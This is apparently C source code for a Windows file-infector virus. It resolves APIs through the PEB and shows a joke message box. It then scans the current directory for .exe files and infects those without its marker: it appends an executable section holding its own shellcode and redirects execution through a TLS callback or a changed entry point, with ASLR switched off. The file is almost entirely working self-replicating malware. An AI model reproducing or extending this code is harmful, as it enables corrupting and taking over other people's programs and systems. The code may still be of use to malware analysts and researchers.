#include <Windows.h>

#include "R.h"
#include "peb-lookup.h"
#include "prototype.h"

#define MEM_ALIGN(operand, alignment) ((operand + (alignment - 1)) & ~(alignment - 1))

void banner(protoLoadLibraryA _LoadLibraryA, protoGetProcAddress _GetProcAddress) {
    HMODULE User32Dll = _LoadLibraryA(aUser32Dll);
#pragma GCC diagnostic ignored "-Wcast-function-type"
    protoMessageBoxA _MessageBoxA = (protoMessageBoxA)_GetProcAddress(User32Dll, aMessageBoxA);
#pragma GCC diagnostic pop
    _MessageBoxA(0, aBocchiTheRock, aHehehe, MB_OK);
}

PIMAGE_SECTION_HEADER getShellcodeSection(LPVOID baseAddress) {
    PIMAGE_DOS_HEADER dosHeader = baseAddress;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)baseAddress + dosHeader->e_lfanew);
    LPVOID sectionHeader = (LPVOID)((ULONG_PTR)ntHeaders + sizeof(IMAGE_NT_HEADERS));

    // NOTE: Add x86 support
    if (ntHeaders->FileHeader.Characteristics & IMAGE_FILE_32BIT_MACHINE) {
        return NULL;
    }

    PIMAGE_SECTION_HEADER textSection = NULL;
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
        PIMAGE_SECTION_HEADER currentSection =
            (PIMAGE_SECTION_HEADER)((ULONG_PTR)sectionHeader + i * sizeof(IMAGE_SECTION_HEADER));
        DWORD64 name = *(PDWORD64)currentSection->Name;
        // .rsrc
        if (name == 0x637373722e) {
            return currentSection;
        }
        // .text
        if (name == 0x747865742e) {
            textSection = currentSection;
        }
    }

    return textSection;
}

int getFileAlignment(protoCreateFileMappingA _CreateFileMappingA, protoMapViewOfFile _MapViewOfFile,
                     protoUnmapViewOfFile _UnmapViewOfFile, protoCloseHandle _CloseHandle, HANDLE file) {
    HANDLE fileMapping = _CreateFileMappingA(file, NULL, PAGE_READONLY, 0, 0, NULL);
    LPVOID baseAddress = _MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);

    PIMAGE_DOS_HEADER dosHeader = baseAddress;
    PIMAGE_NT_HEADERS ntHeaders = baseAddress + dosHeader->e_lfanew;

    int fileAlignment = ntHeaders->OptionalHeader.FileAlignment;

    _UnmapViewOfFile(baseAddress);
    _CloseHandle(fileMapping);

    return fileAlignment;
}

BOOL isInfected(HANDLE kernel32, protoGetProcAddress _GetProcAddress, LPCSTR fileName) {
#pragma GCC diagnostic ignored "-Wcast-function-type"
    protoCloseHandle _CloseHandle = (protoCloseHandle)_GetProcAddress(kernel32, aCloseHandle);
    protoCreateFileA _CreateFileA = (protoCreateFileA)_GetProcAddress(kernel32, aCreateFileA);
    protoCreateFileMappingA _CreateFileMappingA =
        (protoCreateFileMappingA)_GetProcAddress(kernel32, aCreateFileMappingA);
    protoMapViewOfFile _MapViewOfFile = (protoMapViewOfFile)_GetProcAddress(kernel32, aMapViewOfFile);
    protoUnmapViewOfFile _UnmapViewOfFile = (protoUnmapViewOfFile)_GetProcAddress(kernel32, aUnmapViewOfFile);
#pragma GCC diagnostic pop

    HANDLE file =
        _CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    HANDLE fileMapping = _CreateFileMappingA(file, NULL, PAGE_READONLY, 0, 0, NULL);
    LPVOID baseAddress = _MapViewOfFile(fileMapping, FILE_MAP_READ | FILE_MAP_COPY, 0, 0, 0);
    PIMAGE_SECTION_HEADER shellcode = getShellcodeSection(baseAddress);

    BOOL result = TRUE;
    if (shellcode) {
        // .rssc
        result = *(PDWORD64)shellcode->Name == 0x637373722e ||
                 *(PDWORD)((ULONG_PTR)baseAddress + shellcode->PointerToRawData + jmpOffset) == 0xdeadbeef;
    }

    _UnmapViewOfFile(baseAddress);
    _CloseHandle(fileMapping);
    _CloseHandle(file);

    return result;
}

ULONG_PTR RVA2RA(LPVOID baseAddress, int RVA) {
    PIMAGE_DOS_HEADER dosHeader = baseAddress;
    PIMAGE_NT_HEADERS ntHeaders = baseAddress + dosHeader->e_lfanew;
    LPVOID sectionHeader = (LPVOID)(ULONG_PTR)ntHeaders + sizeof(IMAGE_NT_HEADERS);

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
        PIMAGE_SECTION_HEADER currentSection =
            (PIMAGE_SECTION_HEADER)((ULONG_PTR)sectionHeader + i * sizeof(IMAGE_SECTION_HEADER));

        int VA = currentSection->VirtualAddress;
        int VS = currentSection->Misc.VirtualSize;
        if (VA <= RVA && RVA <= VA + VS) {
            return (ULONG_PTR)baseAddress + RVA - VA + currentSection->PointerToRawData;
        }
    }

    return -1;
}

BOOL tlsInject(LPVOID baseAddress, ULONG_PTR callbackAddress) {
    PIMAGE_DOS_HEADER dosHeader = baseAddress;
    PIMAGE_NT_HEADERS ntHeaders = baseAddress + dosHeader->e_lfanew;

    PIMAGE_DATA_DIRECTORY dataDirectoryTLS =
        (PIMAGE_DATA_DIRECTORY)(&ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS]);
    if (!dataDirectoryTLS->VirtualAddress) {
        return FALSE;
    }

    PIMAGE_TLS_DIRECTORY tlsDirectory = (PIMAGE_TLS_DIRECTORY)RVA2RA(baseAddress, dataDirectoryTLS->VirtualAddress);
    PDWORD64 firstCallbackAddress =
        (PDWORD64)RVA2RA(baseAddress, tlsDirectory->AddressOfCallBacks - ntHeaders->OptionalHeader.ImageBase);

    while (*firstCallbackAddress)
        ++firstCallbackAddress;

    *firstCallbackAddress = callbackAddress;
    *(firstCallbackAddress + 1) = 0;

    // Turn off PIE
    ntHeaders->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;

    return TRUE;
}

int inject(HANDLE kernel32, protoLoadLibraryA _LoadLibraryA, protoGetProcAddress _GetProcAddress, LPCSTR fileName) {
    HANDLE ntdll = _LoadLibraryA(aNtDll);

#pragma GCC diagnostic ignored "-Wcast-function-type"
    protoRtlCopyMemory _RtlCopyMemory = (protoRtlCopyMemory)_GetProcAddress(ntdll, aRtlCopyMemory);

    protoCloseHandle _CloseHandle = (protoCloseHandle)_GetProcAddress(kernel32, aCloseHandle);
    protoCreateFileA _CreateFileA = (protoCreateFileA)_GetProcAddress(kernel32, aCreateFileA);
    protoCreateFileMappingA _CreateFileMappingA =
        (protoCreateFileMappingA)_GetProcAddress(kernel32, aCreateFileMappingA);
    protoGetFileSize _GetFileSize = (protoGetFileSize)_GetProcAddress(kernel32, aGetFileSize);
    protoGetModuleFileNameA _GetModuleFileNameA =
        (protoGetModuleFileNameA)_GetProcAddress(kernel32, aGetModuleFileNameA);
    protoMapViewOfFile _MapViewOfFile = (protoMapViewOfFile)_GetProcAddress(kernel32, aMapViewOfFile);
    protoUnmapViewOfFile _UnmapViewOfFile = (protoUnmapViewOfFile)_GetProcAddress(kernel32, aUnmapViewOfFile);
#pragma GCC diagnostic pop

    char baseFileName[MAX_PATH];
    _GetModuleFileNameA(NULL, baseFileName, MAX_PATH);
    HANDLE base =
        _CreateFileA(baseFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (base == INVALID_HANDLE_VALUE) {
        return 1;
    }

    // Using file mapping instead of ReadFile and WriteFile
    HANDLE baseMapping = _CreateFileMappingA(base, NULL, PAGE_READONLY, 0, 0, NULL);
    LPVOID baseAddress = _MapViewOfFile(baseMapping, FILE_MAP_READ | FILE_MAP_COPY, 0, 0, 0);

    PIMAGE_SECTION_HEADER shellcode = getShellcodeSection(baseAddress);

    // NOTE: Change to original shellcode size, otherwise it will grown up over time
    int shellcodeSize = shellcode->SizeOfRawData;

    HANDLE target = _CreateFileA(fileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
                                 FILE_ATTRIBUTE_NORMAL, NULL);
    if (target == INVALID_HANDLE_VALUE) {
        return 2;
    }

    int fileAlignment = getFileAlignment(_CreateFileMappingA, _MapViewOfFile, _UnmapViewOfFile, _CloseHandle, target);
    HANDLE targetMapping = _CreateFileMappingA(
        target, NULL, PAGE_READWRITE, 0, MEM_ALIGN(_GetFileSize(target, NULL) + shellcodeSize, fileAlignment), NULL);
    LPVOID targetAddress = _MapViewOfFile(targetMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);

    PIMAGE_DOS_HEADER dosHeader = targetAddress;
    PIMAGE_NT_HEADERS ntHeaders = targetAddress + dosHeader->e_lfanew;

    // Create new section
    LPVOID sectionHeader = (LPVOID)(ULONG_PTR)ntHeaders + sizeof(IMAGE_NT_HEADERS);
    PIMAGE_SECTION_HEADER newSection =
        (PIMAGE_SECTION_HEADER)((ULONG_PTR)sectionHeader +
                                ntHeaders->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER));
    PIMAGE_SECTION_HEADER lastSection = (PIMAGE_SECTION_HEADER)((ULONG_PTR)newSection - sizeof(IMAGE_SECTION_HEADER));

    ++ntHeaders->FileHeader.NumberOfSections;

    // .rssc
    *(PDWORD64)newSection->Name = 0x637373722e;

    // Calculate new section size
    int sectionAlignment = ntHeaders->OptionalHeader.SectionAlignment;

    newSection->SizeOfRawData = MEM_ALIGN(shellcodeSize, fileAlignment);
    newSection->Misc.VirtualSize = MEM_ALIGN(shellcodeSize, sectionAlignment);

    ntHeaders->OptionalHeader.SizeOfImage += newSection->Misc.VirtualSize;

    newSection->PointerToRawData = lastSection->PointerToRawData + lastSection->SizeOfRawData;
    newSection->VirtualAddress =
        MEM_ALIGN(lastSection->VirtualAddress + lastSection->Misc.VirtualSize, sectionAlignment);

    newSection->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE;

    // Copy shellcode to target
    LPVOID dest = (LPVOID)((ULONG_PTR)targetAddress + newSection->PointerToRawData);
    LPVOID source = (LPVOID)((ULONG_PTR)baseAddress + shellcode->PointerToRawData);
    _RtlCopyMemory(dest, source, shellcodeSize);

    // patch jump relative
    *(PDWORD)(dest + jmpOffset) =
        ntHeaders->OptionalHeader.AddressOfEntryPoint - (newSection->VirtualAddress + jmpOffset + 4);

    if (tlsInject(targetAddress, newSection->VirtualAddress + ntHeaders->OptionalHeader.ImageBase)) {
        // patch jmp to ret
        // *(PDWORD)(dest + jmpOffset - 1) = 0xc3;
    } else {
        // Change OEP to shellcode
        ntHeaders->OptionalHeader.AddressOfEntryPoint = newSection->VirtualAddress;
    }

    _UnmapViewOfFile(targetAddress);
    _CloseHandle(targetMapping);
    _CloseHandle(target);

    _UnmapViewOfFile(baseAddress);
    _CloseHandle(baseMapping);
    _CloseHandle(base);

    return 0;
}

void spread(HANDLE kernel32, protoLoadLibraryA _LoadLibraryA, protoGetProcAddress _GetProcAddress) {
#pragma GCC diagnostic ignored "-Wcast-function-type"
    protoFindFirstFileA _FindFirstFileA = (protoFindFirstFileA)_GetProcAddress(kernel32, aFindFirstFileA);
    protoFindNextFileA _FindNextFileA = (protoFindNextFileA)_GetProcAddress(kernel32, aFindNextFileA);
    protoFindClose _FindClose = (protoFindClose)_GetProcAddress(kernel32, aFindClose);
#pragma GCC diagnostic pop

    WIN32_FIND_DATA ffd;

    char exe[] = {'*', '.', 'e', 'x', 'e', 0};
    HANDLE hFind = _FindFirstFileA(exe, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        if (!isInfected(kernel32, _GetProcAddress, ffd.cFileName)) {
            inject(kernel32, _LoadLibraryA, _GetProcAddress, ffd.cFileName);
        }
    } while (_FindNextFileA(hFind, &ffd));

    _FindClose(hFind);
}

int shellcode() {
    HANDLE kernel32 = getModuleByName(aKernel32Dll);

    LPVOID _LoadLibraryA = getFuncByName(kernel32, aLoadLibraryA);
    LPVOID _GetProcAddress = getFuncByName(kernel32, aGetProcAddress);

    banner(_LoadLibraryA, _GetProcAddress);
    spread(kernel32, _LoadLibraryA, _GetProcAddress);

    return 0;
}

// int main() { shellcode(); }
